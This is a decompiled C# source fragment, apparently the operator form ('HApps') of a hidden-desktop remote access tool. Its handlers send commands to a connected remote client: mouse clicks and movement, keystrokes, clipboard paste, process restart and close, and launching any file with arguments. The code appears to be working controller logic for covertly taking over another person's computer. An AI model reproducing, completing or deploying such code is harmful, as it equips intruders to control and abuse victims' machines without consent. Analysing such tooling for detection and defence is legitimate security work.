		private void RestoreToolStripMenuItem_Click(object sender, EventArgs e)
		{
			bool flag = this.ListView1.SelectedItems.Count > 0;
			if (flag)
			{
				byte[] state = Helper.SB("Restore");
				Client $VB$NonLocal_2 = this.C;
				ThreadPool.QueueUserWorkItem(delegate(object a0)
				{
					$VB$NonLocal_2.BeginSend((byte[])a0);
				}, state);
			}
		}

		// Token: 0x06000558 RID: 1368 RVA: 0x00030550 File Offset: 0x0002E750
		private void RestartToolStripMenuItem_Click(object sender, EventArgs e)
		{
			bool flag = this.ListView1.SelectedItems.Count > 0;
			if (flag)
			{
				try
				{
					foreach (object obj in this.ListView1.SelectedItems)
					{
						ListViewItem listViewItem = (ListViewItem)obj;
						byte[] state = Helper.SB(string.Concat(new string[]
						{
							"Restart",
							SettingsHelper.SPL,
							listViewItem.ToolTipText,
							SettingsHelper.SPL,
							listViewItem.SubItems[1].Text
						}));
						HApps._Closure$__R165-24 CS$<>8__locals1 = new HApps._Closure$__R165-24(CS$<>8__locals1);
						CS$<>8__locals1.$VB$NonLocal_2 = this.C;
						ThreadPool.QueueUserWorkItem(delegate(object a0)
						{
							CS$<>8__locals1.$VB$NonLocal_2.BeginSend((byte[])a0);
						}, state);
					}
				}
				finally
				{
					IEnumerator enumerator;
					if (enumerator is IDisposable)
					{
						(enumerator as IDisposable).Dispose();
					}
				}
			}
		}

		// Token: 0x06000559 RID: 1369 RVA: 0x00030640 File Offset: 0x0002E840
		private void CloseToolStripMenuItem_Click(object sender, EventArgs e)
		{
			bool flag = this.ListView1.SelectedItems.Count > 0;
			if (flag)
			{
				try
				{
					foreach (object obj in this.ListView1.SelectedItems)
					{
						ListViewItem listViewItem = (ListViewItem)obj;
						byte[] state = Helper.SB("Close" + SettingsHelper.SPL + listViewItem.SubItems[1].Text);
						HApps._Closure$__R166-26 CS$<>8__locals1 = new HApps._Closure$__R166-26(CS$<>8__locals1);
						CS$<>8__locals1.$VB$NonLocal_2 = this.C;
						ThreadPool.QueueUserWorkItem(delegate(object a0)
						{
							CS$<>8__locals1.$VB$NonLocal_2.BeginSend((byte[])a0);
						}, state);
					}
				}
				finally
				{
					IEnumerator enumerator;
					if (enumerator is IDisposable)
					{
						(enumerator as IDisposable).Dispose();
					}
				}
			}
		}

		// Token: 0x0600055A RID: 1370 RVA: 0x00030710 File Offset: 0x0002E910
		private void PictureBox1_MouseDown(object sender, MouseEventArgs e)
		{
			bool flag = Operators.CompareString(this.Guna2GradientButton1.Text, "Capturing...", false) == 0 && this.PictureBox1.Image != null && this.PictureBox1.ContainsFocus;
			if (flag)
			{
				Point point = checked(new Point((int)Math.Round((double)(e.X * this.rdSize.Width) / (double)this.PictureBox1.Width), (int)Math.Round((double)(e.Y * this.rdSize.Height) / (double)this.PictureBox1.Height)));
				bool flag2 = e.Button == MouseButtons.Left;
				if (flag2)
				{
					byte[] state = Helper.SB(string.Concat(new string[]
					{
						"LeftDown",
						SettingsHelper.SPL,
						point.X.ToString(),
						SettingsHelper.SPL,
						point.Y.ToString()
					}));
					Client $VB$NonLocal_2 = this.C;
					ThreadPool.QueueUserWorkItem(delegate(object a0)
					{
						$VB$NonLocal_2.BeginSend((byte[])a0);
					}, state);
				}
				bool flag3 = e.Button == MouseButtons.Right;
				if (flag3)
				{
					byte[] state2 = Helper.SB(string.Concat(new string[]
					{
						"RightDown",
						SettingsHelper.SPL,
						point.X.ToString(),
						SettingsHelper.SPL,
						point.Y.ToString()
					}));
					Client $VB$NonLocal_3 = this.C;
					ThreadPool.QueueUserWorkItem(delegate(object a0)
					{
						$VB$NonLocal_3.BeginSend((byte[])a0);
					}, state2);
				}
			}
		}

		// Token: 0x0600055B RID: 1371 RVA: 0x000308C8 File Offset: 0x0002EAC8
		private void PictureBox1_MouseMove(object sender, MouseEventArgs e)
		{
			bool flag = Operators.CompareString(this.Guna2GradientButton1.Text, "Capturing...", false) == 0 && this.PictureBox1.Image != null && this.PictureBox1.ContainsFocus;
			if (flag)
			{
				Point point = checked(new Point((int)Math.Round((double)(e.X * this.rdSize.Width) / (double)this.PictureBox1.Width), (int)Math.Round((double)(e.Y * this.rdSize.Height) / (double)this.PictureBox1.Height)));
				byte[] state = Helper.SB(string.Concat(new string[]
				{
					"MoveCursor",
					SettingsHelper.SPL,
					point.X.ToString(),
					SettingsHelper.SPL,
					point.Y.ToString()
				}));
				Client $VB$NonLocal_2 = this.C;
				ThreadPool.QueueUserWorkItem(delegate(object a0)
				{
					$VB$NonLocal_2.BeginSend((byte[])a0);
				}, state);
			}
		}

		// Token: 0x0600055C RID: 1372 RVA: 0x000309DC File Offset: 0x0002EBDC
		private void PictureBox1_MouseUp(object sender, MouseEventArgs e)
		{
			bool flag = Operators.CompareString(this.Guna2GradientButton1.Text, "Capturing...", false) == 0 && this.PictureBox1.Image != null && this.PictureBox1.ContainsFocus;
			if (flag)
			{
				Point point = checked(new Point((int)Math.Round((double)(e.X * this.rdSize.Width) / (double)this.PictureBox1.Width), (int)Math.Round((double)(e.Y * this.rdSize.Height) / (double)this.PictureBox1.Height)));
				bool flag2 = e.Button == MouseButtons.Left;
				if (flag2)
				{
					byte[] state = Helper.SB(string.Concat(new string[]
					{
						"LeftUp",
						SettingsHelper.SPL,
						point.X.ToString(),
						SettingsHelper.SPL,
						point.Y.ToString()
					}));
					Client $VB$NonLocal_2 = this.C;
					ThreadPool.QueueUserWorkItem(delegate(object a0)
					{
						$VB$NonLocal_2.BeginSend((byte[])a0);
					}, state);
				}
				bool flag3 = e.Button == MouseButtons.Right;
				if (flag3)
				{
					byte[] state2 = Helper.SB(string.Concat(new string[]
					{
						"RightUp",
						SettingsHelper.SPL,
						point.X.ToString(),
						SettingsHelper.SPL,
						point.Y.ToString()
					}));
					Client $VB$NonLocal_3 = this.C;
					ThreadPool.QueueUserWorkItem(delegate(object a0)
					{
						$VB$NonLocal_3.BeginSend((byte[])a0);
					}, state2);
				}
			}
		}

		// Token: 0x0600055D RID: 1373 RVA: 0x00030B94 File Offset: 0x0002ED94
		private void PictureBox1_KeyPress(object sender, KeyPressEventArgs e)
		{
			bool flag = Operators.CompareString(this.Guna2GradientButton1.Text, "Capturing...", false) == 0;
			if (flag)
			{
				byte[] state = Helper.SB("keyboardClick" + SettingsHelper.SPL + Convert.ToBase64String(Encoding.UTF8.GetBytes(e.KeyChar.ToString())));
				Client $VB$NonLocal_2 = this.C;
				ThreadPool.QueueUserWorkItem(delegate(object a0)
				{
					$VB$NonLocal_2.BeginSend((byte[])a0);
				}, state);
			}
		}

		// Token: 0x0600055E RID: 1374 RVA: 0x00030C18 File Offset: 0x0002EE18
		private void PictureBox1_MouseEnter(object sender, EventArgs e)
		{
			bool flag = Operators.CompareString(this.Guna2GradientButton1.Text, "Capturing...", false) == 0;
			if (flag)
			{
				this.PictureBox1.Focus();
			}
		}

		// Token: 0x0600055F RID: 1375 RVA: 0x00030C54 File Offset: 0x0002EE54
		private void HApps_FormClosing(object sender, FormClosingEventArgs e)
		{
			byte[] state = Helper.SB("CloseHApps");
			Client $VB$NonLocal_2 = this.C;
			ThreadPool.QueueUserWorkItem(delegate(object a0)
			{
				$VB$NonLocal_2.BeginSend((byte[])a0);
			}, state);
		}

		// Token: 0x06000560 RID: 1376 RVA: 0x00030C94 File Offset: 0x0002EE94
		private void HApps_ResizeEnd(object sender, EventArgs e)
		{
			bool @checked = this.Guna2ToggleSwitch2.Checked;
			if (@checked)
			{
				byte[] state = Helper.SB(string.Concat(new string[]
				{
					"Resize",
					SettingsHelper.SPL,
					this.PictureBox1.Width.ToString(),
					SettingsHelper.SPL,
					this.PictureBox1.Height.ToString()
				}));
				Client $VB$NonLocal_2 = this.C;
				ThreadPool.QueueUserWorkItem(delegate(object a0)
				{
					$VB$NonLocal_2.BeginSend((byte[])a0);
				}, state);
			}
		}

		// Token: 0x06000561 RID: 1377 RVA: 0x00030D30 File Offset: 0x0002EF30
		private void Guna2ToggleSwitch2_MouseClick(object sender, MouseEventArgs e)
		{
			bool @checked = this.Guna2ToggleSwitch2.Checked;
			if (@checked)
			{
				byte[] state = Helper.SB(string.Concat(new string[]
				{
					"Resize",
					SettingsHelper.SPL,
					this.PictureBox1.Width.ToString(),
					SettingsHelper.SPL,
					this.PictureBox1.Height.ToString()
				}));
				Client $VB$NonLocal_2 = this.C;
				ThreadPool.QueueUserWorkItem(delegate(object a0)
				{
					$VB$NonLocal_2.BeginSend((byte[])a0);
				}, state);
			}
		}

		// Token: 0x06000562 RID: 1378 RVA: 0x00030DCC File Offset: 0x0002EFCC
		private void CustomOpenToolStripMenuItem_Click(object sender, EventArgs e)
		{
			using (CustomOpen customOpen = new CustomOpen())
			{
				customOpen.Guna2TextBox1.PlaceholderText = "Filename";
				customOpen.Guna2TextBox2.PlaceholderText = "Argument";
				customOpen.StartPosition = FormStartPosition.CenterParent;
				bool flag = customOpen.ShowDialog() == DialogResult.OK;
				if (flag)
				{
					byte[] state = Helper.SB(string.Concat(new string[]
					{
						"CustomOpen",
						SettingsHelper.SPL,
						customOpen.Guna2TextBox1.Text,
						SettingsHelper.SPL,
						customOpen.Guna2TextBox2.Text
					}));
					Client $VB$NonLocal_2 = this.C;
					ThreadPool.QueueUserWorkItem(delegate(object a0)
					{
						$VB$NonLocal_2.BeginSend((byte[])a0);
					}, state);
				}
			}
		}

		// Token: 0x06000563 RID: 1379 RVA: 0x00030EA4 File Offset: 0x0002F0A4
		private void Guna2GradientButton5_Click(object sender, EventArgs e)
		{
			bool flag = Operators.CompareString(this.Guna2GradientButton1.Text, "Capturing...", false) == 0;
			if (flag)
			{
				byte[] state = Helper.SB("paste" + SettingsHelper.SPL + Convert.ToBase64String(Encoding.UTF8.GetBytes(Clipboard.GetText())));
				Client $VB$NonLocal_2 = this.C;
				ThreadPool.QueueUserWorkItem(delegate(object a0)
				{
					$VB$NonLocal_2.BeginSend((byte[])a0);
				}, state);
			}
		}

		// Token: 0x06000564 RID: 1380 RVA: 0x00030F20 File Offset: 0x0002F120
		private void ListView1_KeyDown(object sender, KeyEventArgs e)
		{
			try
			{
				bool flag = e.Modifiers == Keys.Control && e.KeyCode == Keys.A;
				if (flag)
				{
					bool flag2 = this.ListView1.Items.Count > 0;
					if (flag2)
					{
						try
						{
							foreach (object obj in this.ListView1.Items)
							{
								ListViewItem listViewItem = (ListViewItem)obj;
								listViewItem.Selected = true;
							}
						}
						finally
						{
							IEnumerator enumerator;
							if (enumerator is IDisposable)
							{
								(enumerator as IDisposable).Dispose();
							}
						}
					}
				}
			}
			catch (Exception ex)
			{
				Debug.WriteLine(ex.Message);
			}
		}

		// Token: 0x04000228 RID: 552
		public Client C;

		// Token: 0x04000229 RID: 553
		public int FPS;

		// Token: 0x0400022A RID: 554
		public Stopwatch sw;

		// Token: 0x0400022B RID: 555
		public Size rdSize;
	}
}
